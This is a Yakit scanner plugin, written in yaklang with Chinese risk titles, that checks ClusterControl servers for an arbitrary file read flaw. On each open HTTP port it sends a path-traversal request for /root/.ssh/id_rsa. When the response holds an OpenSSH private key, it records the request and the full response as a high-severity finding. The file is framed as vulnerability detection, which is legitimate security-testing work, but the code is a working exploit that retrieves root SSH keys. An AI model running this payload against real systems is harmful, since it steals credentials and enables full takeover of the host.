# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /../../../../../../../../..//root/.ssh/id_rsa HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: identity
User-Agent: python-urllib3/1.26.4

`

    rsp,req,_ = poc.HTTP(packet1,
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(5),
    )

    //dump(rsp)
        if str.MatchAllOfSubString(rsp,'HTTP/1.1 200','BEGIN OPENSSH PRIVATE KEY'){
        yakit.Info("%v found ClusterControl存在任意文件读取漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("ClusterControl存在任意文件读取漏洞"),
        risk.severity("high"),
        risk.titleVerbose("ClusterControl存在任意文件读取漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
